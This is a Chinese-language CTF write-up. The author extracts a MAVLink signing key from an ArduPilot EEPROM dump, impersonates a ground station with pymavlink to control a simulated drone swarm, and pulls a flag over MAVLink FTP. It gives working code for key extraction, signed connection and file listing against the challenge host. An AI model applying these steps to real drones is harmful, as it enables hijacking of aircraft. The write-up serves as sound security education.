---
title: 從一顆繳獲的飛控晶片，駭進整個無人機蜂群——STARPWN 2026「One to Rule Them All」解題筆記
tags:
  - STARPWN
  - CTF
  - MAVLink
  - ArduPilot
  - Drone Security
  - Forensics
categories:
  - CTF Writeup
aside: true
toc: true
cover: /posts/77798b75/attack_chain_overview.png
abbrlink: 77798b75
date: 2026-09-21 15:11:24
top_img:
---

> 🌐 English version: [English](/en/posts/77798b75.html)


> 這篇是 STARPWN 2026 這場 CTF 裡，我覺得故事線最完整的一題。技術上好像沒有到很變態，但就是把一個看起來很難的謎題跟幾個比較基礎但很容易被忽略的協定功能湊在一起，然後最後解法簡單到有點好笑的題目，但過程中踩的坑一個都沒少就是了

<!-- more -->

## 題目在講什麼

題目背景是這樣寫的：

{% note info  %}

Prismantir's team got hands on an enemy drone last night - the rest of its swarm went dark before anyone else could be brought in. Its flight controller landed on your desk this morning, still warm. One unit is all we get but word is they all share the same secret, so make it count before someone finds out and changes it.

{% endnote %}


> 翻成白話：我方昨晚抓到敵方一台無人機，牠所屬的整個「蜂群」（swarm，一群互相協同飛行的無人機）在我方來得及動手前就全部斷線消失了。這台被抓到的無人機的「飛控」（Flight Controller，無人機的大腦，一塊裝了感測器、GPS、無線電模組的電路板）現在放在你桌上，餘溫還沒退。手上就這一台，但情報說整個蜂群共用同一組秘密——趁對方還沒發現、還沒換掉這組秘密之前，把它用好用滿


題目這邊給的東西有三樣：

| 項目 | 說明 |
|---|---|
| `eeprom.bin`（16,384 bytes） | 被抓到那台無人機飛控的記憶體原始 dump，靜態、離線、不會再變 |
| Web UI | 一個地面站網頁後台，畫面上可以看到一群還活著、還在飛的無人機 |
| MAVLink Telemetry（`tcp:host:port`） | 一條還活著的即時連線，可以直接跟那群無人機講話 |

在動手之前，得先搞懂一個背景知識：[MAVLink](https://en.wikipedia.org/wiki/MAVLink) 是無人機界最通用的通訊協定，簡單說就是 **無人機跟地面站之間講話用的共同語言**，地面接收站可以問無人機「你現在飛多高、電量多少」，也可以下指令「往這個座標飛」或者是「解除武裝」

正常情況下這個協定沒有加密也沒有身份驗證，任何人只要連得上都能偷聽甚至冒充地面站下指令。為了防止這種事，MAVLink 2 加了一個可選功能叫 **message signing**：地面接收站跟無人機各自持有同一把  `32-byte` 的密鑰，每則指令送出前都要用這把密鑰加上一個遞增的時間戳算一個簽章附在封包後面，收到的一方重算一次簽章比對，對得上才會執行。

> 其實現實世界中也有對應的CVE: [CVE-2026-1579](https://www.sentinelone.com/vulnerability-database/cve-2026-1579/) 
> 這個漏洞舊是因為沒有啟用 Mavlink 2.0 的 messaging signing 導致，畢竟不是enabled by default

換句話說，只要拿到那把 32-byte 密鑰，就可以假裝自己是合法的地面站對整個蜂群發號施令。而題目的核心，就是這把密鑰印在被繳獲的那台無人機的記憶體裡

## 先看看這 16KB 裡面裝了什麼

`eeprom.bin` 剛好是 16,384 bytes，這是開源無人機韌體 **ArduPilot** 在模擬環境（SITL，Software-In-The-Loop）底下用來存放 **斷電後還要記得的資料** 的標準大小，裡面會有飛行參數、任務航點、地理圍籬設定，當然也包括我們要找的簽章密鑰

翻了一下 ArduPilot 原始碼裡 `StorageManager.cpp` 的定義，這塊 16KB 空間內部被切成好幾個固定大小、固定位置的區塊，就像一顆硬碟被分成好幾個分割區：

![eeprom.bin 記憶體佈局圖](eeprom_layout_overview.png)

問題是，16 KB 全部用 hex editor 一個 byte 一個 byte 看太累，也很容易漏。比較有效率的做法是**先掃一遍「哪些區塊裡真的有資料」**——把每個分割區的非零 byte 數量數一數，一片全是 `0x00` 的區塊通常就是空的、可以先跳過，有內容的才需要進一步看。我直接寫幾行 Python 對照 `StorageManager` 的佈局把每個區塊統計出來：

```bash
$ python3 - <<'PY'
data = open('eeprom.bin','rb').read()
regions = [
    ('StorageParam',   0x0000, 0x0600),
    ('StorageMission', 0x0600, 0x0F76),
    ('StorageRally',   0x0F76, 0x0FA0),
    ('StorageFence',   0x0FA0, 0x1000),
    ('unused',         0x1000, 0x1F80),
    ('StorageKeys',    0x1F80, 0x2000),
]
print(f'{"region":<15}{"range":<18}{"size":>6}{"nonzero":>9}   first4')
print('-'*62)
for name, s, e in regions:
    chunk = data[s:e]
    nz = sum(1 for b in chunk if b)
    print(f'{name:<15}0x{s:04X}-0x{e:04X}    {e-s:>5}{nz:>9}   {chunk[:4].hex()}')
PY

region         range               size  nonzero   first4
--------------------------------------------------------------
StorageParam   0x0000-0x0600     1536      155   50410600
StorageMission 0x0600-0x0F76     2422      646   ae650000
StorageRally   0x0F76-0x0FA0       42        0   00000000
StorageFence   0x0FA0-0x1000       96        2   00000000
unused         0x1000-0x1F80     3968        0   00000000
StorageKeys    0x1F80-0x2000      128       41   d1fc5238
```

有了這張表，「怎麼判斷正常沒有異狀」就變得具體多了：

- **`StorageParam`（飛行參數）**：非零資料不少，但用 ArduPilot 的參數格式（一筆一筆的「參數名稱 + 數值」）去解，跑出來全都是校正值、感測器設定那類正常參數，數值也都在合理範圍，沒有夾帶奇怪的字串或結構——所以是正常的。
- **`StorageMission`（任務航點）**：一樣有資料，但解成航點之後就是一條很平凡的圓形巡邏任務（起飛 → 繞圈 → 重複），沒有藏東西。
- **`StorageRally` / `StorageFence`（集合點 / 地理圍籬）**：幾乎全是 `0x00`，`StorageFence` 只剩兩個殘留的非零 byte——這是嵌入式儲存「刪除後沒真的把底層資料抹掉」常見的鑑識痕跡，不是刻意藏的。
- **中間一大段 `unused`**：整片全零，直接跳過。
- **`StorageKeys`**：真正跳出來的就是這一塊。它的前 4 個 byte 是 `d1 fc 52 38`——這不是雜訊，而是一個**看得懂的 magic number**（下一節會解釋為什麼），一眼就知道這裡放了一個有固定結構的東西。

放大看 `StorageKeys` 這 64 bytes：

```bash
$ xxd -s 0x1f80 -l 64 eeprom.bin
00001f80: d1fc 5238 0000 0000 d19d f1ac 3821 0000  ..R8........8!..
00001f90: d4ee 003d 1876 14d9 ffa2 4d20 f58b 4485  ...=.v....M ..D.
00001fa0: 51c2 cdc1 e54c f42f c00b b861 8224 9126  Q....L./...a.$.&
00001fb0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
```

offset `0x1F80`（十進位 8064）的這塊 **StorageKeys**，就是 MAVLink 簽章密鑰存放的地方，也是整題真正有料的部分。

## 解密鑰的過程踩到一個經典的坑

ArduPilot 原始碼 `GCS_Signing.cpp` 定義了密鑰存放時用的 C struct：

```cpp
#define SIGNING_KEY_MAGIC 0x3852fcd1

struct SigningKey {
    uint32_t magic;        // 4 bytes：固定標記，代表這是一把有效密鑰
    uint64_t timestamp;    // 8 bytes：防重放攻擊用的時間戳
    uint8_t secret_key[32];// 32 bytes：真正的密鑰本體
};
```

這裡有一個很容易踩到的坑：這個 struct **沒有加上 `PACKED`** 。在 C/C++ 裡，如果沒特別要求緊密排列，編譯器為了讓 CPU 讀取效率更好，會自動在欄位之間插入 padding，讓每個欄位對齊到它自己大小的整數倍位置。這裡的狀況是：`magic` 佔 4 bytes（offset 0–3），接下來的 `timestamp` 是 8 bytes 的型別，編譯器會要求它從 8 的倍數位置開始，但目前只走到 offset 4，所以編譯器會自動塞 **4 個 0x00 的 padding**，讓 `timestamp` 真正從 offset 8 開始

如果沒注意到這個 padding，直接用 `struct.unpack_from('<IQ', data, offset)` 去解（這邊意思是 4 bytes 整數 + 8 bytes 長整數，中間完全不留空隙），會導致往後每個欄位全部多讀了 4 bytes 的垃圾資料。啊這種 bug 最麻煩的地方在於**它不會報錯！**，只會安靜地給你一把長得很像密鑰、但完全錯誤的假資料，所以唯一可靠的檢查方式，就是解析完先比對一下那個 magic number 對不對，對得上才代表 offset 抓對了

實際解析程式碼：

```python
import struct

with open('eeprom.bin', 'rb') as f:
    data = f.read()

OFFSET = 0x1f80  # StorageKeys 分割區起始位置

# '<' 小端序；'I' 4 bytes 整數 (magic)；'4x' 跳過 4 個 padding bytes（重點！）；'Q' 8 bytes 長整數 (timestamp)
magic, timestamp = struct.unpack_from('<I4xQ', data, OFFSET)
secret_key = data[OFFSET + 16 : OFFSET + 48]

assert magic == 0x3852fcd1, "magic 對不上，代表 offset 或 struct 佈局抓錯了！"
print(f"secret_key = {secret_key.hex()}")
```

實際跑出來的結果：

```
magic      = 0x3852fcd1
timestamp  = 36527303400913
secret_key = d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126
```

這裡的關鍵是第一行的 magic。回頭對照前面從 ArduPilot 原始碼 `GCS_Signing.cpp` 抄下來的定義：

```cpp
#define SIGNING_KEY_MAGIC 0x3852fcd1
```

解出來的 `magic = 0x3852fcd1` 跟原始碼寫死的 `SIGNING_KEY_MAGIC` **一個 byte 都不差**。這代表兩件事同時成立：offset `0x1F80` 抓對了（真的指到 `SigningKey` 結構的開頭），而且那 4 bytes padding 也跳對了（不然 magic 之後每個欄位都會錯位、magic 本身就對不上）。既然這個「檢查碼」過了，後面接著讀出來的 32-byte 密鑰就可以放心相信：

```
d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126
```


下面這張圖是實際的 hex dump，把每個欄位用顏色框起來對照：

![eeprom.bin 內 signing key 的 hex dump 標註圖](eeprom_hexdump_annotated.png)

- 紅色 4 bytes 是 magic（因為是小端序，檔案裡的位元組順序反過來寫成 `d1 fc 52 38`）
- 灰色是那 4 bytes padding
- 藍色是 8 bytes 的 timestamp；綠色的 32 bytes 才是真正要用的密鑰

## 拿密鑰連上真正在飛的無人機群

拿到密鑰後，下一步是驗證題目說的「they all share the same secret」是不是字面意義，這把從離線 EEPROM 挖出來的密鑰，能不能直接拿去對線上還在飛的那群無人機做身份驗證

Python 有一個社群最常用的 MAVLink 函式庫叫 `pymavlink`，內建支援訊息簽章：

```python
from pymavlink import mavutil

HOST, PORT = "0.cloud.chals.io", 16578  # 依題目給的即時 port 為準

# 密鑰要傳原始 32 bytes，不是 hex 字串！
# （這裡踩過一次坑：一開始寫成 KEY.hex()，
#  結果 pymavlink 內部拿字串去做雜湊運算，直接丟出一個看起來毫不相關的 TypeError）
KEY = bytes.fromhex("d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126")

m = mavutil.mavlink_connection(f"tcp:{HOST}:{PORT}", source_system=254, source_component=190)
m.wait_heartbeat(timeout=15)
print("已連上，對方 sysid =", m.target_system)

m.setup_signing(KEY, sign_outgoing=True)   # 之後我方發出的每則訊息都會自動簽章

m.mav.param_request_list_send(1, 1)        # 跟 sysid=1 要求「把所有飛行參數傳給我」
```

實際執行結果：成功收到 1,397 筆參數，代表這把密鑰跟正在天上飛的無人機群用的是同一把，簽章身份驗證完全通過。同樣的密鑰對蜂群裡其餘 4 台無人機測試也全部有效。

> 到這一步，等於已經拿到地面站等級的完整存取權限，代表可以讀取任何一台無人機的完整參數表、任務清單，甚至下達飛行指令

## 中間卡了很久：一堆看起來很合理、其實全是死路的猜測

拿到完整控制權之後，我花了非常多時間在各種猜上，下面都是踩過的坑:
- 比對 5 台無人機的參數差異有沒有藏訊息
- 把飛行路徑畫出來看像不像文字
- 檢查地圖網頁的 CSS 濾鏡
- 聽 WebSocket 封包、抓 dataflash 飛行紀錄檔……

這些全部都是死路，乾淨到沒有任何線索，中間甚至認真想過《魔戒》的梗（啊畢竟題目叫 One to Rule Them All），也測試了改變飛行模式、觸發 Return-to-Launch、強制解除武裝這幾個「動詞」，結果全部只跑出標準的 ArduPilot 系統訊息，什麼都沒有

真正的突破口，是回頭檢查一個已經在用、但沒有用好用滿的的功能：**MAVLink FTP**
> REF: https://mavlink.io/en/services/ftp.html 

## 關鍵轉折：把檔案系統整個列出來

除了讀感測器數值、下飛行指令之外，MAVLink 還定義了一整套檔案傳輸協定（藉由 `FILE_TRANSFER_PROTOCOL` 這個訊息類型），讓地面站可以像操作 USB 隨身碟一樣，瀏覽、上傳、下載飛控內部虛擬檔案系統裡的檔案。

這個協定裡有個 `OP_ListDirectory` Operation Code，功能就是貨真價實的 **列出資料夾內容**，就等同於你在terminal打一次 `ls`

前期最大的盲點是，因為讀過 ArduPilot 文件、知道幾個常見檔名（像 `@SYS/storage.bin`、`crash_dump.bin`），所以一直用「猜檔名 → 直接開檔」的方式在找東西，但就從來沒有真正對根目錄執行過一次完整的遞迴列表，就變成有點在瞎猜，啊這樣就不太可能找到一個你原本不知道存在的檔案

`pymavlink` 內建一個功能完整的 FTP 客戶端類別 `MAVFTP`，可以直接拿前面已經簽章驗證過的連線來用：

```python
from pymavlink.mavftp import MAVFTP

ftp = MAVFTP(m, target_system=1, target_component=1)
all_files = []

def walk(path, depth=0):
    ret = ftp.cmd_list([path])
    if ret.error_code != 0:
        return
    for entry in list(ftp.list_result):
        if entry.name in ('.', '..'):
            continue
        full_path = (path.rstrip('/') + '/' + entry.name) if path != '/' else '/' + entry.name
        if entry.is_dir:
            walk(full_path, depth + 1)     # 遇到資料夾就繼續往下挖
        else:
            all_files.append((full_path, entry.size_b))

walk("/")   # 從根目錄開始，一路挖到底
```

跑出來的完整檔案系統長這樣：

```
/
├── @ROMFS/          （韌體內建資源，跟開源 ArduPilot 一模一樣）
├── @SYS/            （系統診斷用的樣板檔，全是預設佔位內容）
├── DCIM/            <-- ★ 不屬於標準 ArduPilot 檔案系統的東西 ★
│   └── flag.jpg   (40,536 bytes)
└── terrain/         （SITL 內建的地形資料塊）
```

除了 `DCIM/flag.jpg` 之外，其餘每個檔案跟資料夾都是一套全新安裝的 ArduPilot SITL 環境本來就會有的東西。`DCIM`（Digital Camera IMages）這個資料夾名稱本身也完全合理，就感覺是照片，畢竟這格檔案名稱我手機記憶卡也有，但這正好呼應了先前在任務清單裡看過的相機控制指令，所以它藏在一個**看起來很正常、不會讓人起疑** 的路徑底下，就不是無腦取一個像 `flag.txt` 這種一看就很可疑的檔名

## 下載檔案，看到 flag

用同一個 `MAVFTP` 物件把它抓下來：

```python
for attempt in range(5):
    ftp.cmd_get(["/DCIM/flag.jpg", "flag.jpg"])
    result = ftp.process_ftp_reply("get", timeout=30)
    if result.error_code == 0:
        break
```

第一次嘗試出現 `BurstReadFile failed, generic error`，第二次就順利把完整的 40,536 bytes 抓下來，確認是一張合法的 JPEG。

打開來看：

![flag.jpg 原圖](flag.jpg)

一座在雨夜中燈火通明的體育場空拍夜景，屋頂上用發光文字投影著一段訊息。放大看清楚屋頂上的文字：

![flag.jpg 屋頂文字放大](flag_zoom.png)

> "machines never pledged to be allegiant"（機器從來沒有宣誓效忠過任何人）

這座造型是拉斯維加斯真實的 **Allegiant Stadium**（NFL 拉斯維加斯突擊者隊主場）。這句話本身是個雙關語：「allegiant」既是這座體育場的名字，同時也是英文單字「效忠的、忠誠的」

剛好呼應整個題目的核心情境：一台被繳獲的機器，從頭到尾都沒有真正效忠於任何一方，密鑰共用機制反而讓它輕易被策反。組出來的 flag 是：

```
starpwn{machines_never_pledged_to_be_allegiant}
```

## 後記：一個提早出現但當時沒看懂的伏筆

找到 `flag.jpg` 之前，其實有一條旁支線索已經隱約指向 Allegiant Stadium，只是當時沒能把它跟正確答案連起來：透過 MAVLink 讀取蜂群裡每台無人機的起降座標並標在真實衛星地圖上時，發現好幾台無人機的座標精準落在同一棟建築物正中央：

![home 座標標在真實衛星地圖上，紅圈精準對到 Allegiant Stadium](home_area_3x3_marked.png)

圖中紅圈標記的那棟橢圓形建築就是 Allegiant Stadium，跟高速公路交叉口的相對位置完全吻合。當時只當它是巧合沒有深究，回頭看就是整個謎題埋的伏筆，答案本來就設定在這座體育場，只是需要先透過 FTP 找到 `flag.jpg` 才能真正讀出謎底的內容

## 心得歸納

1. **MAVLink FTP 的 `ListDirectory` 是貨真價實的目錄列表功能，不要只把它當成「抓已知檔案」的工具。** 對根目錄跑一次完整遞迴列表只要幾秒鐘，任何不屬於標準韌體的檔案都會無所遁形，完全不需要用猜的
2. **一個聽起來很合理的路徑名稱，比一個明顯可疑的檔名更會讓人放過它。** 檢查一個系統時，別只依賴這個名字看起來很奇怪的直覺，該做的地毯式列表還是要做
3. **解析 C 語言的二進位資料結構時，一定要先查清楚有沒有 `PACKED` 屬性。** 沒有這個屬性代表編譯器會自動插入 padding 對齊欄位，直接套用無縫串接的格式字串會讓後面每個欄位都靜靜地讀錯位置。至於判斷解析對不對的方法，就是檢查結構裡任何已知的固定常數值對不對得上，對得上才代表 offset 抓對了
4. **當很多看起來很合理的線索全部乾乾淨淨地查無所獲時，這通常是個訊號：該回頭檢查有沒有一個基本的協定功能，自己其實從來沒有真正用滿過**，而不是繼續在手上已有的資料裡發明更複雜的假設。這題最後的解法自始至終都只是 MAVLink 協定裡最基本的兩個功能: 訊息簽章 + 檔案列表，沒有用到任何奇技淫巧。

---
